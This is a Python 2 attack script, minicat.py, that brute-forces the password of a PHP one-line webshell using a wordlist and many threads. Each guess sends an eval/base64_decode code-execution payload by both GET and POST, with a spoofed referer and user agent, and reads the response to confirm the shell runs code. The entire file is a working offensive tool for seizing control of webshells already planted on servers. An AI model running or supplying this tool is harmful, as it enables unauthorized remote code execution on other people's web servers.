#!/usr/bin/env python
# coding: utf-8
#
# PHP 一句话密码爆破
#
# e.g: shell >> http://www.demo.com/shell.php
#
#       python minicat.py http://www.demo.com/shell.php passwords.txt
#

import sys
import requests
import re

from multiprocessing.dummy import Pool as ThreadPool


default_header = {
    'Accept': '*/*',
    'Accept-Charset': 'GBK,utf-8;q=0.7,*;q=0.3',
    'Accept-Language': 'zh-CN,zh;q=0.8',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Referer': 'http://www.baidu.com',
    'User-Agent': ('Mozilla/5.0 (Windows NT 6.1; '
                   'WOW64) AppleWebKit/537.17 (KHTML, like Gecko) '
                   'Chrome/24.0.1312.52 Safari/537.17')
}


def check(params):
    shell_url, password = params
    if check_get(shell_url, password):
        print 'url: %s [%s] <GET>' % (shell_url, password)
    if check_post(shell_url, password):
        print 'url: %s [%s] <POST>' % (shell_url, password)


def check_get(shell_url, password):
    result = False

    payload = 'cHJpbnQgbWQ1KDEpOw=='  # "print md5(1);"
    get_payload = '%s=@eval($_POST[f]($_POST[g]));&f=base64_decode&g=%s' % (password, payload)

    # try "get" method
    response = requests.get(shell_url + get_payload, headers=default_header, allow_redirects=False)
    m = re.compile(r'c4ca4238a0b923820dcc509a6f75849b').findall(response.content)
    if m:
        result = True

    return result


def check_post(shell_url, password):
    result = False

    payload = 'cHJpbnQgbWQ1KDEpOw=='  # "print md5(1);"
    post_payload = {
        password: '@eval($_POST[f]($_POST[g]));',
        'f': 'base64_decode',
        'g': payload
    }

    # try "post" method
    response = requests.post(shell_url, data=post_payload, headers=default_header, allow_redirects=False)
    # print response.content
    m = re.compile(r'c4ca4238a0b923820dcc509a6f75849b').findall(response.content)
    if m:
        result = True

    return result


if __name__ == '__main__':
    if sys.argv.__len__() < 4:
        print 'Usage: %s <shell_url> <pass_file> <thread_num>' % sys.argv[0]
        sys.exit()

    target = sys.argv[1]
    pass_file = sys.argv[2]
    thread_num = int(sys.argv[3])

    wordlist = open(pass_file, 'r').readlines()

    brute_list = []
    for try_pass in wordlist:
        brute_list.append((target, try_pass.strip()))

    pool = ThreadPool(thread_num)
    pool.map(check, brute_list)

